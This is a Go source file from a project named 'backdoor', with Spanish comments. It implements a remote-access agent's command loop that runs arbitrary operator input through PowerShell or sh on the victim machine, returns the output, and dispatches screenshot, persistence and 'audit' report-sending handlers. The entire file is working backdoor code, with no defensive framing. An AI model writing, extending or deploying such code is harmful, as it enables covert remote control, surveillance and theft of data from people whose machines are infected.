package handler

import (
	"backdoor/report"
	"backdoor/transport"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

type CommandHandler func(t transport.Transport, args []string)

// specialCommands son comandos propios del agente.
// Cualquier otra entrada se ejecuta directamente en la shell del sistema.
var specialCommands = map[string]CommandHandler{
	"screen":      ScreenshotHandler,
	"persistence": PersistenceHandler,
	"audit":       AuditHandler,
}

func Handle(t transport.Transport) {
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}
	cwd, _ := os.Getwd()

	var shellPath string
	var shellArgs []string
	if runtime.GOOS == "windows" {
		shellPath = "powershell.exe"
		shellArgs = []string{"-NoLogo", "-Command"}
	} else {
		shellPath = "sh"
		shellArgs = []string{"-c"}
	}

	sendPrompt(t, username, cwd)

	for {
		input, err := t.Read()
		if err != nil {
			return
		}

		line := strings.TrimSpace(string(input))
		if line == "" {
			sendPrompt(t, username, cwd)
			continue
		}

		parts := strings.Fields(line)
		command := parts[0]
		args := parts[1:]

		switch {
		case command == "exit":
			t.Write([]byte("Sesión cerrada.\r\n"))
			return

		case command == "cd":
			var target string
			if len(args) > 0 {
				target = strings.Join(args, " ")
			} else {
				target, _ = os.UserHomeDir()
			}
			if err := os.Chdir(target); err != nil {
				t.Write([]byte(fmt.Sprintf("[!] cd: %v\r\n", err)))
			}
			cwd, _ = os.Getwd()

		case specialCommands[command] != nil:
			specialCommands[command](t, args)

		default:
			cmd := exec.Command(shellPath, append(shellArgs, line)...)
			cmd.Dir = cwd
			output, err := cmd.CombinedOutput()
			result := string(output)
			if err != nil && result == "" {
				result = fmt.Sprintf("[!] %v\r\n", err)
			}
			result = strings.ReplaceAll(result, "\n", "\r\n")
			t.Write([]byte(result))
		}

		sendPrompt(t, username, cwd)
	}
}

func sendPrompt(t transport.Transport, username, cwd string) {
	prompt := fmt.Sprintf("[agent] %s@%s > ", username, cwd)
	t.Write([]byte(prompt))
}

func AuditHandler(t transport.Transport, args []string) {
	t.Write([]byte("Generando y enviando reporte de auditoría...\r\n"))
	if err := report.NewAuditReport(); err != nil {
		t.Write([]byte("Error enviando reporte: " + err.Error() + "\r\n"))
	} else {
		t.Write([]byte("Reporte enviado correctamente\r\n"))
	}
}
